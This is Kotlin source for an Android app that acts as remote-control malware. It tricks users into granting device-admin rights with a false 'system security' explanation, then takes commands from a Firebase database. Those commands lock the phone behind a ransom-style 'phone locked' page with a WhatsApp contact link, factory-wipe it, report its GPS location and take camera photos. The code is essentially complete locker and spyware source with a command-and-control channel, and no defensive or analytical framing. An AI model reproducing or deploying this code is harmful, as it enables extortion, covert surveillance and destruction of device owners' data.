package com.bug.gugun

import android.app.Activity
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.provider.MediaStore
import android.util.Base64
import android.util.Log
import android.view.WindowManager
import android.webkit.WebChromeClient
import android.webkit.WebSettings
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.Toast
import com.google.firebase.database.DataSnapshot
import com.google.firebase.database.DatabaseError
import com.google.firebase.database.DatabaseReference
import com.google.firebase.database.FirebaseDatabase
import com.google.firebase.database.ServerValue
import com.google.firebase.database.ValueEventListener
import java.io.ByteArrayOutputStream
import java.text.SimpleDateFormat
import java.util.Locale
import java.util.TimeZone
import java.util.UUID

class MainActivity : Activity() {

    private lateinit var webView: WebView
    private lateinit var db: DatabaseReference

    private val deviceId: String by lazy {
        val prefs = getSharedPreferences("zenn", Context.MODE_PRIVATE)
        var id = prefs.getString("device_id", null)
        if (id == null) {
            id = "zen_" + UUID.randomUUID().toString().replace("-", "").substring(0, 13)
            prefs.edit().putString("device_id", id).apply()
        }
        id
    }

    private var isLocked = false
    private var lastCommandTime: Long = 0
    private var lastKamera = "depan"

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        window.setFlags(
            WindowManager.LayoutParams.FLAG_FULLSCREEN,
            WindowManager.LayoutParams.FLAG_FULLSCREEN
        )
        window.addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)

        webView = WebView(this)
        webView.settings.apply {
            javaScriptEnabled = true
            domStorageEnabled = true
            allowFileAccess = true
            allowContentAccess = true
            mediaPlaybackRequiresUserGesture = false
            loadWithOverviewMode = true
            useWideViewPort = true
            cacheMode = WebSettings.LOAD_NO_CACHE
        }

        webView.webChromeClient = object : WebChromeClient() {
            override fun onPermissionRequest(request: android.webkit.PermissionRequest) {
                runOnUiThread { request.grant(request.resources) }
            }
        }

        webView.webViewClient = object : WebViewClient() {
            override fun shouldOverrideUrlLoading(view: WebView?, url: String?): Boolean {
                return isLocked
            }
        }

        setContentView(webView)
        webView.loadUrl("file:///android_asset/index.html")

        requestDeviceAdmin()

        db = FirebaseDatabase.getInstance().reference.child("devices").child(deviceId)

        registerDevice()
        listenCommand()

        Handler(Looper.getMainLooper()).postDelayed(object : Runnable {
            override fun run() {
                updateStatus()
                Handler(Looper.getMainLooper()).postDelayed(this, 10000)
            }
        }, 10000)

        requestRuntimePermissions()
        
        Toast.makeText(this, "Device ID: " + deviceId, Toast.LENGTH_LONG).show()
    }

    private fun requestRuntimePermissions() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) return
        val perms = mutableListOf<String>()
        if (checkSelfPermission(android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            perms.add(android.Manifest.permission.CAMERA)
        }
        if (checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            perms.add(android.Manifest.permission.ACCESS_FINE_LOCATION)
        }
        if (checkSelfPermission(android.Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
            perms.add(android.Manifest.permission.ACCESS_COARSE_LOCATION)
        }
        if (perms.isNotEmpty()) {
            requestPermissions(perms.toTypedArray(), 100)
        }
    }

    private fun requestDeviceAdmin() {
        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val admin = ComponentName(this, AdminReceiver::class.java)
        if (!dpm.isAdminActive(admin)) {
            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin)
            intent.putExtra(
                DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                "Aktifkan untuk keamanan sistem"
            )
            startActivity(intent)
        }
    }

    private fun registerDevice() {
        val data = mapOf(
            "model" to (Build.MANUFACTURER + " " + Build.MODEL),
            "online" to true,
            "last_seen" to ServerValue.TIMESTAMP,
            "android" to Build.VERSION.RELEASE
        )
        db.updateChildren(data)
    }

    private fun updateStatus() {
        db.child("online").setValue(true)
        db.child("last_seen").setValue(ServerValue.TIMESTAMP)
    }

    private fun listenCommand() {
        db.child("command").addValueEventListener(object : ValueEventListener {
            override fun onDataChange(snapshot: DataSnapshot) {
                val cmd = snapshot.value as? Map<*, *> ?: return
                val action = cmd["action"] as? String ?: return
                val waktu = cmd["waktu"] as? String ?: return

                val cmdTime = parseTime(waktu)
                if (cmdTime <= lastCommandTime) return
                lastCommandTime = cmdTime

                runOnUiThread {
                    Toast.makeText(this@MainActivity, "Command: $action", Toast.LENGTH_SHORT).show()
                }

                when (action) {
                    "lock" -> {
                        val html = cmd["html"] as? String ?: "<h1>HP TERKUNCI</h1>"
                        val wa = cmd["wa"] as? String ?: ""
                        lockDevice(html, wa)
                    }
                    "unlock" -> unlockDevice()
                    "wipe" -> wipeData()
                    "track" -> trackLocation()
                    "photo" -> {
                        lastKamera = cmd["kamera"] as? String ?: "depan"
                        takePhoto(lastKamera)
                    }
                }

                Handler(Looper.getMainLooper()).postDelayed({
                    db.child("command").removeValue()
                }, 60000)
            }

            override fun onCancelled(error: DatabaseError) {
                Log.e("ZENN", "Command error: " + error.message)
            }
        })
    }

    private fun parseTime(s: String): Long {
        return try {
            SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", Locale.US).apply {
                timeZone = TimeZone.getTimeZone("UTC")
            }.parse(s)?.time ?: 0L
        } catch (e: Exception) {
            0L
        }
    }

    private fun lockDevice(html: String, wa: String) {
        Log.d("ZENN", "lockDevice called")
        isLocked = true

        var finalHtml = html
        if (wa.isNotEmpty()) {
            val cleanWa = if (wa.startsWith("0")) "62" + wa.substring(1) else wa
            finalHtml += "<div style='text-align:center;padding:20px;background:#000;'><a href='https://wa.me/$cleanWa' style='display:inline-block;padding:15px 30px;background:#25D366;color:#fff;text-decoration:none;border-radius:50px;font-weight:bold;'>HUBUNGI VIA WHATSAPP</a></div>"
        }

        Log.d("ZENN", "HTML length: " + finalHtml.length)

        runOnUiThread {
            try {
                webView.loadDataWithBaseURL(null, finalHtml, "text/html", "UTF-8", null)
                Log.d("ZENN", "WebView loaded")
                Toast.makeText(this@MainActivity, "Locked!", Toast.LENGTH_SHORT).show()
            } catch (e: Exception) {
                Log.e("ZENN", "Load error: " + e.message)
                Toast.makeText(this@MainActivity, "Error: " + e.message, Toast.LENGTH_LONG).show()
            }
        }

        try {
            val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val admin = ComponentName(this, AdminReceiver::class.java)
            if (dpm.isAdminActive(admin)) {
                dpm.lockNow()
            }
        } catch (e: Exception) {
            Log.e("ZENN", "Lock error: " + e.message)
        }

        db.child("locked").setValue(true)
        db.child("locked_at").setValue(ServerValue.TIMESTAMP)
    }

    private fun unlockDevice() {
        isLocked = false
        runOnUiThread {
            webView.loadUrl("file:///android_asset/index.html")
            Toast.makeText(this@MainActivity, "Unlocked", Toast.LENGTH_SHORT).show()
        }
        db.child("locked").setValue(false)
    }

    private fun wipeData() {
        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        val admin = ComponentName(this, AdminReceiver::class.java)
        if (dpm.isAdminActive(admin)) {
            try {
                dpm.wipeData(0)
            } catch (e: Exception) {
                clearAppData()
            }
        } else {
            clearAppData()
        }
        db.child("wiped").setValue(true)
    }

    private fun clearAppData() {
        try {
            cacheDir.deleteRecursively()
            filesDir.deleteRecursively()
            getSharedPreferences("zenn", Context.MODE_PRIVATE).edit().clear().apply()
        } catch (e: Exception) {}
    }

    private fun trackLocation() {
        try {
            val lm = getSystemService(Context.LOCATION_SERVICE) as LocationManager

            if (checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
                db.child("location").setValue(mapOf(
                    "lat" to "-", "lng" to "-",
                    "error" to "Izin lokasi ditolak",
                    "waktu" to ServerValue.TIMESTAMP
                ))
                return
            }

            val listener = object : LocationListener {
                override fun onLocationChanged(location: Location) {
                    db.child("location").setValue(mapOf(
                        "lat" to location.latitude.toString(),
                        "lng" to location.longitude.toString(),
                        "accuracy" to location.accuracy.toString(),
                        "waktu" to ServerValue.TIMESTAMP
                    ))
                }
                override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
                override fun onProviderEnabled(provider: String) {}
                override fun onProviderDisabled(provider: String) {}
            }

            lm.requestSingleUpdate(LocationManager.GPS_PROVIDER, listener, Looper.getMainLooper())
            lm.requestSingleUpdate(LocationManager.NETWORK_PROVIDER, listener, Looper.getMainLooper())

            Handler(Looper.getMainLooper()).postDelayed({
                val loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER)
                    ?: lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
                if (loc != null) {
                    db.child("location").setValue(mapOf(
                        "lat" to loc.latitude.toString(),
                        "lng" to loc.longitude.toString(),
                        "accuracy" to loc.accuracy.toString(),
                        "waktu" to ServerValue.TIMESTAMP
                    ))
                }
            }, 5000)

        } catch (e: Exception) {
            db.child("location").setValue(mapOf(
                "lat" to "-", "lng" to "-",
                "error" to e.message,
                "waktu" to ServerValue.TIMESTAMP
            ))
        }
    }

    private fun takePhoto(kamera: String) {
        try {
            if (checkSelfPermission(android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                db.child("photo").setValue(mapOf(
                    "url" to "https://placehold.co/400x600/111/444?text=IZIN+DITOLAK",
                    "kamera" to kamera,
                    "error" to "Izin kamera ditolak",
                    "waktu" to ServerValue.TIMESTAMP
                ))
                return
            }

            val intent = Intent(MediaStore.ACTION_IMAGE_CAPTURE)
            if (kamera == "depan") {
                intent.putExtra("android.intent.extras.CAMERA_FACING", 1)
                intent.putExtra("android.intent.extras.LENS_FACING_FRONT", 1)
                intent.putExtra("android.intent.extra.USE_FRONT_CAMERA", true)
            } else {
                intent.putExtra("android.intent.extras.CAMERA_FACING", 0)
            }

            startActivityForResult(intent, 1001)

        } catch (e: Exception) {
            db.child("photo").setValue(mapOf(
                "url" to "https://placehold.co/400x600/111/444?text=ERROR",
                "error" to e.message,
                "waktu" to ServerValue.TIMESTAMP
            ))
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)

        if (requestCode == 1001 && resultCode == RESULT_OK && data != null) {
            val imageBitmap = data.extras?.get("data") as? Bitmap
            if (imageBitmap != null) {
                val stream = ByteArrayOutputStream()
                imageBitmap.compress(Bitmap.CompressFormat.JPEG, 50, stream)
                val bytes = stream.toByteArray()
                val base64 = Base64.encodeToString(bytes, Base64.DEFAULT)
                val dataUrl = "data:image/jpeg;base64,$base64"

                db.child("photo").setValue(mapOf(
                    "url" to dataUrl,
                    "kamera" to lastKamera,
                    "waktu" to ServerValue.TIMESTAMP
                ))
            }
        }
    }

    override fun onBackPressed() {
        if (isLocked) {
            // Blokir back
        } else {
            super.onBackPressed()
        }
    }

    override fun onResume() {
        super.onResume()
        if (isLocked) {
            val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val admin = ComponentName(this, AdminReceiver::class.java)
            if (dpm.isAdminActive(admin)) dpm.lockNow()
        }
    }

    override fun onPause() {
        super.onPause()
        if (isLocked) {
            val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val admin = ComponentName(this, AdminReceiver::class.java)
            if (dpm.isAdminActive(admin)) dpm.lockNow()
        }
    }
}
